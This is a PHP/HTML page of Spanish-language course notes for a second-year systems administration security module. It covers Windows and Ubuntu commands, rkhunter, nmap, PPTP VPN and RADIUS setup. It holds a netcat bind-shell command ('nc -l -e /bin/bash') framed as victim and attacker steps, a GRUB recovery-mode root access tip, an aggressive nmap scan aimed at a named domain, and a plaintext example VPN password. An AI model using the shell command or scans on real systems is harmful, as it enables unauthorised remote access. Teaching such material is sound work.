<?php
ini_set('display_errors', '1');
?>
<?php include("../../../../php/paypal.php");?>
<!DOCTYPE html>
<HTML>
	<!-- ------------------------------------------------ C   A   B   E   C   E   R   A -------------------------------------------------------------- -->
	<HEAD>
		<TITLE>ASIR2: SEGURIDAD Y ALTA DISPONIBILIDAD</TITLE> <!-- Establece el título de mi web -->
		<!-- Diferentes opciones del tag META <META HTTP-EQUIV= 
		"Refresh" CONTENT="10"> --><!-- Establece que mi web se 
		actualice cada 10 segundos -->
		<META NAME="keywords" CONTENT="HTML, internet "> <!-- Palabras clave para que los grandes 
		buscadores como Google, puedan identificar mi web --> 
		<META NAME="description" CONTENT="Manual para escribir HTML.">
		<meta http-equiv="content-type" content="text/html;charset=utf-8" />
		<!-- Una breve descripción que los buscadores mostrarán -->
		<LINK REL=StyleSheet HREF="../../../../estilos/menu_principal.css" TYPE="text/css">
		<LINK REL=StyleSheet HREF="../Ajustes/estilos.css" TYPE="text/css">
		<script type="text/javascript" src="../Ajustes/scripts.js"></script>
		<script type="text/javascript" src="../../../../estilos/scripts.js"></script>
		<?php include('../Ajustes/funciones.php');?>
		<?php #$ejemplo_html_numero = 1;?>
		<?php #$ejemplo_php_numero = 1;?>
		<?php $ejemplo_numero = 1;?>
</HEAD>
<!----------------------------------------------------------------------
CUERPO
----------------------------------------------------------------------->
<BODY onload="resolucion()">
<!----------------------------------------------------------------------
MENUS
----------------------------------------------------------------------->
<div class="menus">
	<div class="menu_principal">
		<ul class="menu">
			<li><a href="../../../../">ASIR</a></li>
			<li><a href="../../../">SEGUNDO</a></li>
			<li><a href="../../">ASIGNATURAS</a></li>
			<li>SEGURIDAD Y ALTA DISPONIBILIDAD</li>
			<?=paypal()?>
		</ul>
	</div>
	<div class="menu_asignatura">
		<ul class="menu">
			<li><a href="../">Índice</a></li>
		</ul>
	</div>
</div>
<!----------------------------------------------------------------------
FIN MENUS
----------------------------------------------------------------------->
<div class="contenido">
<!----------------------------------------------------------------------
TEMA N
-----------------------------------------------------------------------
<a name="teman"></a>
<div class="tema">
<H1>N. Título</H1>

</DIV>
----------------------------------------------------------------------
FIN TEMA N
----------------------------------------------------------------------->

<!----------------------------------------------------------------------
TEMA 1 
----------------------------------------------------------------------->
<!------ INSERTAR EJEMPLOS------------------------------------------
	<?php #echo incluir_ejemplo_html(null);?>
	<?php #echo incluir_ejemplo_php(null);?>
---------------------------------------------------------------------->

<a name="tema1"></a>
<div class="tema">
	<H1>TEMA 1: SEGURIDAD</H1>
	<p>Apuntes del profesor:</p>
	<?php echo crear_lista_enlaces_archivos_directorio("./apuntes"); ?>
		<h2>Windows</h2>
			<h3>Comandos útiles:</h3>
			<ul>
				<li>sfc /scannow
				<br>Escanea el sistema en busca de fallos.
				</li>
			</ul>
		<h2>Ubuntu</h2>
			<p>En ubuntu hay que tener cuidado a la hora de instalarlo, ya que si no se pone una clave al usuario root
			se puede iniciar el sistema en modo recuperación (pulsando escape al arrancar para que se muestre el menú de GRUB) y 
			arrancar una terminal en modo root.</p>
			<h3>netcat - Abrir terminal remota:</h3>
				<p>Hay que desinstalar el netcat-openbsd e instalar el netcat-traditional</p>
				<p>En el equipo de la víctima:</p>
				<textarea cols=100># nc -l -e /bin/bash -p 7000</textarea>
				<p>En el equipo del atacante:</p>
				<textarea cols=100># nc ip puerto</textarea>
			<p>Para comprobar si tenemos algun rootkit se puede usar el rkhunter</p>
				<textarea cols=100># rkhunter --checkall</textarea>
			<h3>nmap</h3>
				<p>Instalación</p>
				<textarea cols=100># apt-get install nmap nmapsi4 pnscan zenmap</textarea>
				<p>Ejecutar</p>
				<textarea cols=100># nmap -A -T4 -PN www.centrodeestudiosalmi.com</textarea>
</div>
<a name="vpn"></a>
<div class="tema">
<h1>VPN en Linux</h1>
<p>Instalamos los paquetes necesarios:</p>
<pre> # apt-get install pptpd</pre>
<p>Configuramos el servicio editando /etc/pptpd.conf</p>
<pre>
localip 10.0.0.1
remoteip 10.0.0.2-10
</pre>
<p>Editamos el fichero /etc/ppp/chap-secrets</p>
<pre>
# Secrets for authentication using CHAP
# client        server  secret                  IP addresses
uservpn         *       Almi123                 *
</pre>
<p>Reiniciamos el servicio</p>
<pre># service pptpd restart</pre>
</div>

<a name="radius"></a>
<div class="tema">
<h1>Servidor Radius</h1>
<pre> # apt-get install freeradius</pre>
<p>Editamos el fichero /etc/freeradius/users</p>
</div>

<a name="edicion"></a>
<font color=red>Editando...</font>
</div>
	</BODY>
</HTML>
